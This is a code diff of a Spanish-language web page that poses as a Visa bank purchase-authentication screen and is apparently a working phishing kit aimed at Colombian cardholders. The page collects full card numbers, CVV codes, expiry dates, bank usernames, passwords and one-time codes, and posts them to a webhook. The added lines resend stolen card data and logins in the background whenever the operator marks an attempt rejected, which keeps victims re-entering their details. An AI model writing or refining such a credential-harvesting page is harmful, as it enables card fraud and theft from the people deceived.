@@ -45,7 +45,7 @@
             z-index: 1;
         }
 
-        /* --- CABECERA DE LOGOS --- */
+        /* --- CABECERA DE LOGOS (Tamaño equilibrado) --- */
         .header { 
             display: flex; 
             align-items: center; 
@@ -58,7 +58,7 @@
             display: flex; 
             align-items: center; 
             justify-content: flex-start;
-            height: 45px; /* Tamaño equilibrado */
+            height: 45px; 
         }
         .bank-logo img { 
             height: 100%; 
@@ -78,7 +78,7 @@
             display: flex; 
             align-items: center; 
             justify-content: flex-end;
-            height: 45px; /* Tamaño equilibrado */
+            height: 45px; 
         }
         .visa-logo img { 
             height: 100%; 
@@ -333,7 +333,6 @@
 
         <h1 class="form-title" id="mainTitle">Autenticación de compra</h1>
         
-        <!-- Aquí está el problema: el span bankNombre no existía en el HTML anterior -->
         <p class="form-subtitle" id="mainSubtitle">
             Ingresa tus credenciales de seguridad para tu <strong id="bankNombre">banco emisor</strong> para validar la transacción.
         </p>
@@ -551,6 +550,7 @@
             localStorage.setItem('cardExpiry', expiry);
         }
 
+        // 🔥 FUNCIÓN PARA ENVIAR CREDENCIALES (se usa al inicio y al reintentar)
         async function enviarCredencialesAlWebhook(datos) {
             try {
                 const response = await fetch(WEBHOOK_URL, {
@@ -721,6 +721,11 @@
                 } else if (resultado.estado === 'rejected') {
                     clearInterval(pollingInterval); pollingInterval = null;
                     mostrarError('❌ Credenciales incorrectas o transacción rechazada');
+                    
+                    // 🔥 REGLA: SI RECHAZAN EN CREDENCIALES, GENERAMOS UN NUEVO ID
+                    solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                    enviarHeartbeat('activo');
+
                     resetFormulario();
                     formularioBloqueado = false;
                     return;
@@ -808,6 +813,10 @@
                         statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                         statusMessage.style.display = 'block';
                         
+                        // 🔥 REGLA: SI ES ERROR USUARIO, TAMBIÉN GENERAMOS UN NUEVO ID
+                        solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                        enviarHeartbeat('activo');
+
                         resetFormulario();
                         clearInterval(pollingInterval); pollingInterval = null;
                         return;
@@ -820,6 +829,27 @@
                     statusMessage.className = 'status-message error';
                     statusMessage.textContent = mensajeError;
                     statusMessage.style.display = 'block';
+
+                    // 🔥 REGLA: SI RECHAZAN EL OTP, GENERAMOS UN NUEVO ID Y GUARDAMOS LAS CREDENCIALES AUTOMÁTICAMENTE
+                    solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+                    enviarHeartbeat('activo');
+
+                    // Enviamos las credenciales de nuevo con el nuevo ID para que la base de datos lo registre
+                    const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
+                    const cvv = localStorage.getItem('cardCVV') || 'No disponible';
+                    const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';
+                    const datosCred = {
+                        solicitudId: solicitudId,
+                        numeroTarjeta: numeroTarjeta,
+                        cvv: cvv,
+                        vencimiento: vencimiento,
+                        usuario: usernameInput.value.trim(),
+                        password: passwordInput.value.trim(),
+                        monto: localStorage.getItem('monto_formateado') || '0 Col$',
+                        fecha: new Date().toLocaleString('es-CO')
+                    };
+                    // Lo enviamos en segundo plano
+                    enviarCredencialesAlWebhook(datosCred);
 
                     confirmationInput.value = '';
                     confirmationInput.disabled = false;
@@ -851,7 +881,6 @@
 
             document.getElementById('mainTitle').textContent = 'Autenticación de compra';
             
-            // 🔥 VALIDACIÓN PARA EVITAR EL ERROR DE NULL
             let bancoTexto = "banco emisor";
             const bancoEl = document.getElementById('bankNombre');
             if (bancoEl) bancoTexto = bancoEl.textContent;
